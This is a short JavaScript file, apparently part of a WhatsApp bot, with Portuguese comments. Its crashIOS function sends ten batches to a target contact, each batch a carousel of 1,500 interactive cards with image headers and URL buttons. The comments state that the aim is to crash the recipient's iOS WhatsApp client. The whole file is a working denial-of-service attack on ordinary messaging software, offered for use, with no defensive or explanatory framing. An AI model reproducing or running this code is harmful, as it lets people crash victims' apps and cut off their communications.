// main.js
const {
  generateWAMessageFromContent,
  delay
} = require("@angstvorfrauen/baileys");
const fs = require("fs");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");

// === OBJETO GLOBAL ===
const main = {
  sock: null,

  // === SETA O SOCKET (chamado no index.js) ===
  setSocket(socket) {
    this.sock = socket;
    console.log("[MAIN] Socket atualizado com sucesso.");
  },

  // === CRASH iOS: SÓ RECEBE targetJid ===
  async crashIOS(targetJid) {
    if (!this.sock) throw new Error("Socket não conectado");

    console.log(`[CRASH] Iniciando 10 lotes para ${targetJid}...`);

    for (let i = 0; i < 10; i++) {
      const singleCard = {
        header: {
          title: ".",
          imageMessage: {
            url, mimetype: "image/jpeg", caption: ".",
            fileSha256, fileLength: "10", height: 1000, width: 1000,
            mediaKey, fileEncSha256, directPath, jpegThumbnail
          },
          hasMediaAttachment: true
        },
        body: { text: "." },
        footer: { text: "." },
        nativeFlowMessage: {
          buttons: [{
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "x",
              url: "https://google.com",
              merchant_url: "https://google.com"
            })
          }]
        }
      };

      const cards = Array(1500).fill(singleCard);

      try {
        console.log(`[CRASH] Lote ${i + 1}/10 → ${targetJid}`);
        await this.sock.sendjson(targetJid, {
          interactiveMessage: {
            body: { text: "." },
            carouselMessage: { cards }
          }
        });
        await delay(800);
      } catch (err) {
        console.error(`[CRASH] Erro lote ${i + 1}:`, err.message);
      }
    }
    console.log("[CRASH] 10 lotes enviados!");
  },

  // === HANDLER (opcional) ===
  async handler(sock, m, chatUpdate) {
    // Pode adicionar comandos manuais aqui
  }
};

// === EXPORTA OBJETO ÚNICO ===
module.exports = main;
